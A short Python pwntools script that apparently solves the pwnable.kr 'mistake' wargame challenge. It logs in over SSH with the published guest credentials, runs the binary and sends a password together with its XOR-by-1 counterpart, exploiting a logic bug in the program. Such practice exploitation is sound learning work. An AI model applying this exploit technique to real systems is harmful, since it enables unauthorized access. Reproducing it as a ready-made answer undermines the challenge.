from pwn import *

s = ssh("mistake", "pwnable.kr", port=2222, password="guest")

p = s.process("mistake")

pwd2 = '0000000000'
pwd1 = ''

pwd1 = ''.join(chr(ord(char) ^ 1) for char in pwd2)

p.sendline(pwd1.encode())
print(p.readline().decode())

sleep(20)

p.sendline(pwd2.encode())
print(p.recvuntil(b':').decode())

print(p.recvall())